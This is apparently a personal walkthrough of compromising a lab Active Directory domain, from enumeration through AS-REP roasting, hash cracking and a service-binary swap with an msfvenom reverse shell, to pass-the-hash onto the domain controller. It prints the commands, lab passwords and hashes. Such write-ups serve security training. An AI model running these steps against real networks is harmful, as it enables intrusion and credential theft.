Started with autorecon and target discovery
``` sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.2        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
```
![[Pasted image 20260811120436.png]]

Discovered usernames with netxec ldap
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2]
└─$ netexec ldap 10.0.2.4 -u egreen -p '!!pLaYa!!90' --users
LDAP        10.0.2.4        389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.4        389    DC01             [+] hack-academy.local\egreen:!!pLaYa!!90 
LDAP        10.0.2.4        389    DC01             [*] Enumerated 15 domain users: hack-academy.local
LDAP        10.0.2.4        389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.0.2.4        389    DC01             Administrator                 2025-11-22 12:29:20 56       Built-in account for administering the computer/domain      
LDAP        10.0.2.4        389    DC01             Guest                         <never>             56       Built-in account for guest access to the computer/domain    
LDAP        10.0.2.4        389    DC01             krbtgt                        2025-08-24 13:08:23 56       Key Distribution Center Service Account                     
LDAP        10.0.2.4        389    DC01             mjohnson                      2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             lbennett                      2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             egreen                        2025-11-17 23:19:09 0                                                                    
LDAP        10.0.2.4        389    DC01             spatel                        2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             dreyes                        2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             nflores                       2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             clee                          2025-11-17 23:19:09 0                                                                    
LDAP        10.0.2.4        389    DC01             otran                         2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             zmiller                       2025-11-17 23:19:09 0                                                                    
LDAP        10.0.2.4        389    DC01             mross                         2025-11-17 23:19:09 0                                                                    
LDAP        10.0.2.4        389    DC01             twest                         2025-11-17 23:19:09 56                                                                   
LDAP        10.0.2.4        389    DC01             eknight                       2025-11-17 23:19:09 56   
```
![[Pasted image 20260811121944.png]]

tested for AS-REP Roasting and clee is vulnerable
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2]
└─$ impacket-GetNPUsers hack-academy.local/egreen
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
clee            2025-11-17 23:19:09.251438  2025-12-04 23:55:29.285920  0x410200 
```
![[Pasted image 20260811122020.png]]

AS-REP Roast
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2]
└─$ impacket-GetNPUsers -dc-ip 10.0.2.4 'hack-academy.local/' -usersfile usernames -format hashcat 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>
$krb5asrep$23$clee@HACK-ACADEMY.LOCAL:62d980bfad2b3f9997a411e545bfdbcb$250a84e362725dd643b81e4cddb8abee535f63afeb355abf3a32ae8e3473a6bf0a6f61003772801b831f7609673064f83eccf93ecfc024561176bc4f5f472f37356eb4f51b2201c990fdf6845f1e5117f7d861ecc9cf1fdae2a155c3c181728fdf3565f09d62978d96204f9ec7c22c6d0c63a79206fa05a087ab9d0d4f85dbefe90095e02d6648eb7ba44f4fd7976b32f1a494d4cfa0fbea8ce5813a3fb72de7862625111925d1616b2b7235f24002faaeab13e977a722a4758da74223931e67b3e95504864fc9a2fced1a10ba307337dfda04a7c68190934a236629c308926befe7f62a5f9736d4ff7c55d898928bffdd741283f5f718d4

```
![[Pasted image 20260811132938.png]]

Crack with john
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!XzUfrog69      ($krb5asrep$23$clee@HACK-ACADEMY.LOCAL)     
1g 0:00:00:10 DONE (2026-08-11 05:23) 0.09861g/s 1414Kp/s 1414Kc/s 1414KC/s !)(OPPQR..!!12QWert
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
![[Pasted image 20260811122407.png]]

at this point i collect data with bloodhound and start bloodhound
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ bloodhound-python -u "clee" -p '!!XzUfrog69' -d hack-academy.local -c all --zip -ns 10.0.2.4      
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 16 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Client-2.hack-academy.local
INFO: Querying computer: Client-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 00S
INFO: Compressing output into 20260811063501_bloodhound.zip

┌──(kali㉿kali)-[~/AD/bloodhound]
└─$ sudo ./bloodhound-cli up
[sudo] password for kali: 
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Bringing up the BloodHound environment

```
![[Pasted image 20260811133607.png]]
![[Pasted image 20260811133614.png]]

Okay moved powerup.ps1 to target and ran allchecks
![[Pasted image 20260811172740.png]]

There is service Wondershare InstallAssist that we can exploit
![[Pasted image 20260811172754.png]]

Create msfvenom payload
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/exploit]
└─$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=10.0.2.5 LPORT=443 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD2/exploit]
└─$ mv shell.exe InstallAssistService.exe    
```
![[Pasted image 20260811173504.png]]

Replace the service file and restart the machine to catch shell:
![[Pasted image 20260811173535.png]]

and then we add egreen to admin group for easier access via winrm
```
C:\Windows\system32>net localgroup "Administrators" egreen /add
net localgroup "Administrators" egreen /add
The command completed successfully.
```
![[Pasted image 20260811173756.png]]

confirm with nxc-sweep
![[Pasted image 20260811173813.png]]

Then Dump hashes. Got mross hash to crack
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ impacket-secretsdump egreen@10.0.2.9                                                        
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

<REDACTED>
[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/mross:$DCC2$10240#mross#448f790be9a5c9e1cd36e1faf4b53e04: (2025-11-15 10:14:16+00:00)
```
![[Pasted image 20260811174005.png]]

Cracked mross:!!TWIZtid11
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ john hash_mross --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
Use the "--format=HMAC-MD5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!TWIZtid11      (HACK-ACADEMY.LOCAL/mross)  
```
![[Pasted image 20260811180259.png]]

testing the creds we can see client-1 as pwnd
``` sh    
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ netexec winrm ips -u mross -p '!!TWIZtid11'
WINRM       10.0.2.7        5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       10.0.2.4        5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) 
WINRM       10.0.2.9        5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.7        5985   CLIENT-1         [+] hack-academy.local\mross:!!TWIZtid11 (Pwn3d!)
```
![[Pasted image 20260811180456.png]]

Then we can dump hashes again and we get zmillers hash who is domain admin (bloodhound enum)
![[Pasted image 20260811180653.png]]

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD2/loot]
└─$ impacket-secretsdump mross@10.0.2.7  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<REDACTED>

[*] Dumping cached domain logon information (domain/username:hash)
HACK-ACADEMY.LOCAL/zmiller:$DCC2$10240#zmiller#d9136c822b2084fad389e66f858efb54: (2025-11-15 10:14:37+00:00)

```

cracked the hash zmiller:!!WaR1972!!
![[Pasted image 20260811183404.png]]

confirm creds with nxc-sweep
![[Pasted image 20260811183420.png]]

dump all hashes
![[Pasted image 20260811183431.png]]

Pass the hash as administrator and thats it
``` sh
impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::409c:8a16:c5fb:9329%4
   IPv4 Address. . . . . . . . . . . : 10.0.2.4
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

```
![[Pasted image 20260811183446.png]]